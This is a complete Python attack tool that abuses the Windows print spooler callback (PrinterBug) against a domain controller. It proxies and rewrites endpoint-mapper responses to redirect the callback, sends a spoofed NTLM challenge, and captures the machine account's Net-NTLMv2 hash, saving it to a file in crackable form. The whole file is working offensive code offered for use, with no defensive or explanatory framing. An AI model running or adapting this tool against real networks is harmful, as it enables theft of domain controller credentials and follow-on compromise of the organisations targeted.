#!/usr/bin/env python3
"""
epm_proxy.py — EPM proxy + NTLM capture for PrinterBug via TCP

Intercepts PrinterBug RPC callback, redirects via EPM proxy, captures
Net-NTLMv2 hash from the machine account. Works against any DC.

Usage:
  sudo python3 epm_proxy.py -dc DC_IP -l LISTENER_IP

The NTLM challenge template is captured dynamically from the target DC
at startup, so this works universally without hardcoded values.
"""

import argparse
import socket
import struct
import threading
import sys
import os
import re
import subprocess
import time
from binascii import hexlify

NTLM_CHALLENGE = os.urandom(8)
CHALLENGE_TEMPLATE = None  # Captured from real DC at startup


def find_spooler_port(dc_ip, username, password, domain):
    """Discover Spooler TCP port via rpcdump."""
    try:
        result = subprocess.run(
            ['rpcdump.py', f'{domain}/{username}:{password}@{dc_ip}'],
            capture_output=True, text=True, timeout=30)
        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if '12345678-1234-ABCD-EF00-0123456789AB' in line.upper():
                for j in range(i + 1, min(i + 10, len(lines))):
                    if 'ncacn_ip_tcp' in lines[j]:
                        m = re.search(r'\[(\d+)\]', lines[j])
                        if m:
                            return int(m.group(1))
                    if lines[j].strip().startswith('UUID') or lines[j].strip().startswith('Protocol'):
                        break
    except:
        pass
    return None


def capture_challenge_template(dc_ip, spooler_port):
    """Connect to DC's real spooler, send NTLM negotiate, capture the challenge.

    This gives us the exact NTLM challenge format the DC uses (hostname,
    domain, DNS info, flags, target info) which we reuse with our own
    challenge bytes.
    """
    from impacket.uuid import uuidtup_to_bin

    RPRN_UUID = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB', '1.0'))
    NDR_UUID = uuidtup_to_bin(('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((dc_ip, spooler_port))

    # NTLM negotiate without version flag
    neg_flags = 0xe2088233 & ~0x02000000
    neg = b'NTLMSSP\x00' + struct.pack('<I', 1) + struct.pack('<I', neg_flags)
    neg += struct.pack('<HHI', 0, 0, 0) + struct.pack('<HHI', 0, 0, 0)

    # RPC bind with NTLM negotiate
    ctx = struct.pack('<HH', 0, 1) + RPRN_UUID + NDR_UUID
    bind = struct.pack('<HHI', 4280, 4280, 0) + struct.pack('<BBH', 1, 0, 0) + ctx
    auth_hdr = struct.pack('<BBBBI', 10, 6, 0, 0, 0)
    frag = 16 + len(bind) + 8 + len(neg)
    header = struct.pack('<BBBB', 5, 0, 11, 3) + b'\x10\x00\x00\x00'
    header += struct.pack('<HHI', frag, len(neg), 1)

    sock.sendall(header + bind + auth_hdr + neg)

    resp = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if len(resp) >= 16:
                if len(resp) >= struct.unpack('<H', resp[8:10])[0]:
                    break
        except:
            break

    sock.close()

    if len(resp) < 20 or resp[2] != 12:
        return None

    frag_len = struct.unpack('<H', resp[8:10])[0]
    auth_len = struct.unpack('<H', resp[10:12])[0]

    if auth_len == 0:
        return None

    auth_off = frag_len - auth_len - 8
    auth_value = resp[auth_off + 8:auth_off + 8 + auth_len]

    if auth_value[:7] != b'NTLMSSP' or struct.unpack('<I', auth_value[8:12])[0] != 2:
        return None

    # Also capture the bind_ack template (everything before auth)
    bind_ack_template = resp[:auth_off]

    return auth_value, bind_ack_template


def build_ntlm_challenge():
    """Build NTLM challenge using template captured from real DC at startup."""
    global CHALLENGE_TEMPLATE
    if CHALLENGE_TEMPLATE is not None:
        result = bytearray(CHALLENGE_TEMPLATE)
        result[24:32] = NTLM_CHALLENGE
        return bytes(result)

    # Fallback: build a proper challenge from scratch
    sig = b'NTLMSSP\x00'
    msg_type = struct.pack('<I', 2)
    target = 'PSYCHOCORP'.encode('utf-16-le')
    target_fields = struct.pack('<HHI', len(target), len(target), 56)
    flags = struct.pack('<I', 0xe2898235)
    challenge = NTLM_CHALLENGE
    reserved = b'\x00' * 8
    domain_nb = 'PSYCHOCORP'.encode('utf-16-le')
    comp_nb = 'DC'.encode('utf-16-le')
    domain_dns = 'psychocorp.local'.encode('utf-16-le')
    comp_dns = 'dc.psychocorp.local'.encode('utf-16-le')
    ts = struct.pack('<Q', int(time.time() * 10000000) + 116444736000000000)
    ti = struct.pack('<HH', 2, len(domain_nb)) + domain_nb
    ti += struct.pack('<HH', 1, len(comp_nb)) + comp_nb
    ti += struct.pack('<HH', 4, len(domain_dns)) + domain_dns
    ti += struct.pack('<HH', 3, len(comp_dns)) + comp_dns
    ti += struct.pack('<HH', 7, 8) + ts
    ti += struct.pack('<HH', 0, 0)
    ti_off = 56 + len(target)
    ti_fields = struct.pack('<HHI', len(ti), len(ti), ti_off)
    return sig + msg_type + target_fields + flags + challenge + reserved + ti_fields + target + ti


def build_bind_ack(call_id, ntlm_token=None, bind_ack_template=None):
    """Build bind_ack using the captured template from the real DC."""
    if bind_ack_template and ntlm_token:
        # Use real DC template — replace call_id and append auth
        template = bytearray(bind_ack_template)
        # Fix call_id
        template[12:16] = struct.pack('<I', call_id)
        # Append auth verifier
        auth_hdr = struct.pack('<BBBBI', 10, 6, 0, 0, 0)
        full = bytes(template) + auth_hdr + ntlm_token
        # Fix frag_len and auth_len in header
        full = bytearray(full)
        full[8:10] = struct.pack('<H', len(full))
        full[10:12] = struct.pack('<H', len(ntlm_token))
        return bytes(full)

    # Fallback: build from scratch matching real DC format
    # sec_addr = port as string + null
    sec_addr = b'9998\x00'
    body = struct.pack('<HH', 4280, 4280)
    body += struct.pack('<I', 0x1939399d)
    body += struct.pack('<H', len(sec_addr))
    body += sec_addr
    # Pad to 4-byte boundary
    total = 16 + len(body)
    if total % 4:
        body += b'\x00' * (4 - total % 4)
    # Result: 1 item, accepted
    body += struct.pack('<I', 1) + struct.pack('<HH', 0, 0)
    body += bytes.fromhex('045d888aeb1cc9119fe808002b104860') + struct.pack('<I', 2)
    if ntlm_token:
        auth_hdr = struct.pack('<BBBBI', 10, 6, 0, 0, 0)
        frag = 16 + len(body) + 8 + len(ntlm_token)
        hdr = struct.pack('<BBBB', 5, 0, 12, 0x03) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', frag, len(ntlm_token), call_id)
        return hdr + body + auth_hdr + ntlm_token
    frag = 16 + len(body)
    hdr = struct.pack('<BBBB', 5, 0, 12, 0x03) + b'\x10\x00\x00\x00'
    hdr += struct.pack('<HHI', frag, 0, call_id)
    return hdr + body


def parse_header(data):
    if len(data) < 16:
        return None
    frag, auth, cid = struct.unpack('<HHI', data[8:16])
    return {'ptype': data[2], 'frag_len': frag, 'auth_len': auth, 'call_id': cid}


def extract_auth(data, hdr):
    if hdr['auth_len'] == 0:
        return None
    off = hdr['frag_len'] - hdr['auth_len'] - 8
    if off < 16 or off >= len(data):
        return None
    return data[off + 8:off + 8 + hdr['auth_len']]


def parse_ntlmv2(auth):
    if len(auth) < 52 or auth[:7] != b'NTLMSSP' or struct.unpack('<I', auth[8:12])[0] != 3:
        return None
    nt_len, _, nt_off = struct.unpack('<HHI', auth[20:28])
    dom_len, _, dom_off = struct.unpack('<HHI', auth[28:36])
    usr_len, _, usr_off = struct.unpack('<HHI', auth[36:44])
    hst_len, _, hst_off = struct.unpack('<HHI', auth[44:52])
    d = auth[dom_off:dom_off + dom_len].decode('utf-16-le', errors='replace')
    u = auth[usr_off:usr_off + usr_len].decode('utf-16-le', errors='replace')
    h = auth[hst_off:hst_off + hst_len].decode('utf-16-le', errors='replace')
    nt = auth[nt_off:nt_off + nt_len]
    if nt_len > 24:
        ch = hexlify(NTLM_CHALLENGE).decode()
        return f"{u}::{d}:{ch}:{hexlify(nt[:16]).decode()}:{hexlify(nt[16:]).decode()}", u, d, h
    return None


BIND_ACK_TEMPLATE = None


def proxy_epm(client_sock, client_addr, dc_ip, listener_ip, svc_port):
    """Proxy EPM: forward to real DC, modify response IP:port."""
    print(f"\n[*] EPM connection from {client_addr[0]}:{client_addr[1]}")
    try:
        dc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dc_sock.settimeout(5)
        dc_sock.connect((dc_ip, 135))

        while True:
            try:
                data = client_sock.recv(4096)
                if not data:
                    break
            except:
                break

            dc_sock.sendall(data)

            resp = b''
            while True:
                try:
                    chunk = dc_sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) >= 16:
                        if len(resp) >= struct.unpack('<H', resp[8:10])[0]:
                            break
                except:
                    break

            if not resp:
                break

            dc_ip_bytes = socket.inet_aton(dc_ip)
            our_ip_bytes = socket.inet_aton(listener_ip)
            our_port_bytes = struct.pack('>H', svc_port)

            if dc_ip_bytes in resp:
                modified = bytearray(resp)
                idx = 0
                while True:
                    try:
                        pos = modified.index(dc_ip_bytes, idx)
                        modified[pos:pos + 4] = our_ip_bytes
                        for j in range(pos - 10, pos):
                            if j >= 0 and modified[j] == 0x07:
                                port_offset = j + 1 + 2
                                if port_offset + 2 <= len(modified):
                                    old_port = struct.unpack('>H', bytes(modified[port_offset:port_offset + 2]))[0]
                                    modified[port_offset:port_offset + 2] = our_port_bytes
                                    print(f"[+] Replaced {dc_ip}:{old_port} → {listener_ip}:{svc_port}")
                                break
                        idx = pos + 4
                    except ValueError:
                        break
                resp = bytes(modified)

            client_sock.sendall(resp)

        dc_sock.close()
    except Exception as e:
        print(f"[-] EPM proxy: {e}")
    finally:
        client_sock.close()


def handle_svc(sock, addr):
    """Handle callback — capture NTLM."""
    global BIND_ACK_TEMPLATE
    print(f"\n[+++] Spooler callback from {addr[0]}:{addr[1]}")
    try:
        data = sock.recv(4096)
        if not data:
            return
        hdr = parse_header(data)
        if not hdr:
            return

        auth = extract_auth(data, hdr) if hdr['auth_len'] > 0 else None

        if auth and auth[:7] == b'NTLMSSP' and struct.unpack('<I', auth[8:12])[0] == 1:
            print(f"[+] NTLM Negotiate ({hdr['auth_len']}b)")
            ch = build_ntlm_challenge()
            ack = build_bind_ack(hdr['call_id'], ch, None)  # Always use constructed bind_ack
            sock.sendall(ack)
            print(f"[+] Challenge sent ({len(ch)}b)")

            for _ in range(5):
                try:
                    data2 = sock.recv(4096)
                    if not data2:
                        break
                    hdr2 = parse_header(data2)
                    if not hdr2:
                        break

                    if hdr2['auth_len'] > 0:
                        auth2 = extract_auth(data2, hdr2)
                        if auth2 and auth2[:7] == b'NTLMSSP':
                            mt = struct.unpack('<I', auth2[8:12])[0]
                            if mt == 3:
                                r = parse_ntlmv2(auth2)
                                if r:
                                    hash_str, u, d, ho = r
                                    print(f"\n{'=' * 60}")
                                    print(f"  NET-NTLMv2 CAPTURED!")
                                    print(f"  {d}\\{u} @ {ho}")
                                    print(f"  {hash_str}")
                                    print(f"{'=' * 60}")
                                    with open('captured_hashes.txt', 'a') as f:
                                        f.write(hash_str + '\n')
                                    print(f"[+] Saved to captured_hashes.txt")
                                return
                            elif mt == 1:
                                ptype = 15 if hdr2['ptype'] == 14 else 12
                                ch2 = build_ntlm_challenge()
                                ack2 = build_bind_ack(hdr2['call_id'], ch2, None)
                                ack2 = ack2[:2] + bytes([ptype]) + ack2[3:]
                                sock.sendall(ack2)
                except:
                    break

        elif hdr['ptype'] == 11 and hdr['auth_len'] == 0:
            ch = build_ntlm_challenge()
            sock.sendall(build_bind_ack(hdr['call_id'], ch, None))
            try:
                data2 = sock.recv(4096)
            except:
                pass

    except Exception as e:
        print(f"[-] Capture: {e}")
    finally:
        sock.close()


def main():
    global CHALLENGE_TEMPLATE, BIND_ACK_TEMPLATE

    parser = argparse.ArgumentParser(description="EPM Proxy + NTLM Capture for PrinterBug TCP")
    parser.add_argument("-dc", required=True, help="Target DC IP")
    parser.add_argument("-l", required=True, help="Listener IP (this host)")
    parser.add_argument("-u", "--username", default="", help="Username (for auto-discovery)")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-d", "--domain", default="", help="Domain")
    parser.add_argument("--epm-port", type=int, default=135)
    parser.add_argument("--svc-port", type=int, default=9998)
    args = parser.parse_args()

    print(f"[*] PrinterBug TCP — EPM Proxy + NTLM Capture")
    print(f"[*] DC: {args.dc}  Listener: {args.l}")
    print(f"[*] EPM proxy: :{args.epm_port} → {args.dc}:135")
    print(f"[*] Capture service: :{args.svc_port}\n")

    # Capture real NTLM challenge template from DC
    # This gives us the exact flags, hostname, domain, target info the DC expects
    print(f"[*] Capturing NTLM challenge template from DC...")
    if args.username and args.domain:
        spooler_port = find_spooler_port(args.dc, args.username, args.password, args.domain)
        if spooler_port:
            print(f"[+] Spooler on TCP/{spooler_port}")
            try:
                result = capture_challenge_template(args.dc, spooler_port)
                if result:
                    CHALLENGE_TEMPLATE = result[0]
                    print(f"[+] Challenge template captured ({len(CHALLENGE_TEMPLATE)}b)")
                else:
                    print(f"[*] Template capture failed — using generic")
            except Exception as e:
                print(f"[*] Template capture error: {e} — using generic")
        else:
            print(f"[*] Spooler port not found — using generic challenge")
    else:
        print(f"[*] No creds provided — using generic challenge")
        print(f"[*] For best results, provide -u/-p/-d to capture real challenge template")

    print(f"[*] Challenge: {hexlify(NTLM_CHALLENGE).decode()}\n")

    # Start servers
    epm = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    epm.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    epm.bind(('0.0.0.0', args.epm_port))
    epm.listen(5)

    svc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    svc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    svc.bind(('0.0.0.0', args.svc_port))
    svc.listen(5)

    print(f"[*] Listening on :{args.epm_port} (EPM) and :{args.svc_port} (capture)")
    print(f"[*] Waiting for PrinterBug callback...\n")

    def loop(server, handler, *handler_args):
        while True:
            c, a = server.accept()
            c.settimeout(10)
            threading.Thread(target=handler, args=(c, a, *handler_args), daemon=True).start()

    threading.Thread(target=loop, args=(epm, proxy_epm, args.dc, args.l, args.svc_port), daemon=True).start()
    threading.Thread(target=loop, args=(svc, handle_svc), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
